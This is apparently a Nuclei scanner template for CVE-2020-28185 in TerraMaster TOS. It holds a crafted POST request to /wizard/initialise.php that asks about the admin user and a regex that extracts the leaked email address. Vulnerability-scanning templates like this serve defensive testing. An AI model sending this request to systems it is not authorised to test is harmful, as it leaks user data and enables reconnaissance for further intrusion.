id: terramaster-disclosure-cve-2020-28185

info:
  name: TerraMaster TOS initialise.php Information Disclosure
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    TerraMaster TOS has an information disclosure vulnerability in `initialise.php`. An attacker can exploit this vulnerability to obtain sensitive information by sending crafted requests.
  reference:
    - https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/
    - https://www.terra-master.com/
  classification:
    cve-id: CVE-2020-28185
    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    cvss-score: 5.3

http:
  - raw:
      - |
        POST /wizard/initialise.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Referer: http://{{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        tab=checkuser&username=admin
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"status"'
      - type: regex
        regex:
          - '"email":"(.*?)"'
    extractors:
      - type: regex
        name: extracted_email
        part: body
        regex:
          - '"email":"(.*?)"'
        group: 1
    stop-at-first-match: true
